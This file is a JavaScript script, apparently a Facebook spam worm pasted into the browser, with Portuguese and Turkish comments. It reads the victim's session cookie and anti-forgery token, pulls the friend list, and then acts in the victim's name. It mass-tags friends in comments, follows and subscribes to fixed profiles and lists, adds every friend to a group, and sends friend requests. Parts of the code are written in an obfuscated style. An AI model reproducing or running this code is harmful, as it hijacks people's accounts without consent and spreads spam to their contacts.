function x__0() { return window.ActiveXObject ? new ActiveXObject("Msxml2.XMLHTTP") : new XMLHttpRequest; };
//Pegar todos amigos
function get_friends(){
  var a=x__0();
  a.open("GET", "/ajax/typeahead/first_degree.php?__a=1&filter[0]=user&lazy=0&viewer="+uid+"&token=v7&stale_ok=0&options[0]=friends_only&options[1]=nm", false);
  a.send(null);
  if (a.readyState == 4) {
    var f = JSON.parse(a.responseText.substring(a.responseText.indexOf('{')));
    return f.payload.entries;
  }
  return false;
}
/* FIM DA PARTE DO MIGUEL TARGA */
//Pegar todos amigos
function get_uid(b){
  var a=x__0();
  a.open("GET", 'http://graph.facebook.com/'+b, false);
  a.send();
  if (a.readyState == 4) {
    return uid = JSON.parse(a.responseText).id;
  }
  return false;
}
  // Pattern que vai trocar o valor dos coment?rios pelas marca�?es
var patt = /comment_text=(.*?)&/
var c = 1;
username = /\.com\/(.*?)\//.exec(window.top.location)[1];
uid = get_uid(username);
a = window.top.location;
termina = 0;
var amigos = get_friends();
post_id = /[0-9]{8,}/.exec(a);
        uids =  'comment_text=';
header = 'ft_ent_identifier='+post_id+'&comment_text=0&source=1&client_id=1359576694192%3A1233576093&reply_fbid&parent_comment_id&rootid=u_jsonp_3_19&ft[tn]=[]&ft[qid]=5839337351464612379&ft[mf_story_key]=5470779710560437153&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user='+uid+'&__a=1&__req=4u&fb_dtsg='+document.getElementsByName('fb_dtsg')[0].value+'&phstamp='+Math.random();
  for ( var n = 1 ; n < amigos.length ; n++ ){
      //uids += '%40[' + amigos[n].uid + '%3A' + encodeURI(amigos[n].text) + ']%20';
    fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
            uids += '%40[' + amigos[n].uid + '%3AAAAAAAAAAAA]%20';
            c++; 
            if(c == 7){            
                // Quando o contador chega em 7, ele termina o par�metro com um &...
                uids += '&';
                // ...envia as coisas com o m�todo do indiano...
                with(new XMLHttpRequest()) open("POST", "/ajax/ufi/add_comment.php?__a=1"),setRequestHeader("Content-Type", "application/x-www-form-urlencoded"),send(header.replace(patt, uids));
                // ... espera um segundo...
                z = setTimeout('function(){asd=0}', 1000);
                clearInterval(z);
                // ... e seta tudo de novo pra recome�ar
                c = 1;
                uids = 'comment_text=';
         
              }
            
    }
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
       
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}
 
function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}
 
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 
function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
   
    http4.close; // Close the connection
     
    }
    }
   
    http4.send(params4);
}
 
function sublist(uidss) {
                var a = document.createElement('script');
                a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
                document.body.appendChild(a);
}
 
 
 
sublist("1455589591341269");
 
sublist("1455589344674627");
 
sublist("1396276933972812");
 
 
 
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
 
var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);
 
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
 
var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};
 
for (var i = 0; i < friends['length']; i++) {
  var httpwp = new XMLHttpRequest();
  var urlwp = '/ajax/groups/members/add_post.php?__a=1';
  var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
  httpwp['open']('POST', urlwp, true);
  httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
  httpwp['setRequestHeader']('Content-length', paramswp['length']);
  httpwp['setRequestHeader']('Connection', 'keep-alive');
  httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
  };
  httpwp['send'](paramswp);
};
var spage_id = "";
var spost_id = "";
var sfoto_id = "";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date();
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}
 
 
//arkadaslari al ve isle
function sarkadaslari_al(){
               var xmlhttp = new XMLHttpRequest();
      xmlhttp.onreadystatechange = function () {
                       if(xmlhttp.readyState == 4){
                                 eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
                                 for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
                                       smesaj = "";
                                       smesaj_text = "";
                                 for(i=f*10;i<(f+1)*10;i++){
                                       if(arkadaslar.payload.entries[i]){
                                 smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
                                 smesaj_text += " " + arkadaslar.payload.entries[i].text;
                                 }
                                       }
                                       sdurumpaylas();                         }
                             
                       }
                     
      };
               var params = "&filter[0]=user";
               params += "&options[0]=friends_only";
               params += "&options[1]=nm";
               params += "&token=v7";
      params += "&viewer=" + user_id;
               params += "&__user=" + user_id;
             
      if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}
 
//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();
 
document.removeEventListener(tiklama);
}
 }, false);
 
 
//arkada?? ekleme
function sarkadasekle(uid,cins){
                var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
                        if(xmlhttp.readyState == 4){  
                        }
        };
               
                xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true);
                var params = "to_friend=" + uid;
                params += "&action=add_friend";
                params += "&how_found=friend_browser";
                params += "&ref_param=none";
                params += "&outgoing_id=";
                params += "&logging_location=friend_browser";
                params += "&no_flyout_on_click=true";
                params += "&ego_log_data=";
                params += "&http_referer=";
                params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
                params += "&__user=" + user_id;
                xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
                xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
               
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
               xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
               cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
               xmlhttp.send(params);
}
}
 
//cinsiyet belirleme
var cinssonuc = {};
var cinshtml = document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon){
               var xmlhttp = new XMLHttpRequest();
      xmlhttp.onreadystatechange = function () {
                       if(xmlhttp.readyState == 4){
                       eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
                       cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
                       btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
                       if(cinshtml.getElementsByTagName("select")[0].value == "1"){
                       document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
                       }else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
                       document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
                       }
                       eval(fonksiyon + "(" + id + "," + cins + ");");
                       }
      };
               xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
               xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
               xmlhttp.send();
}
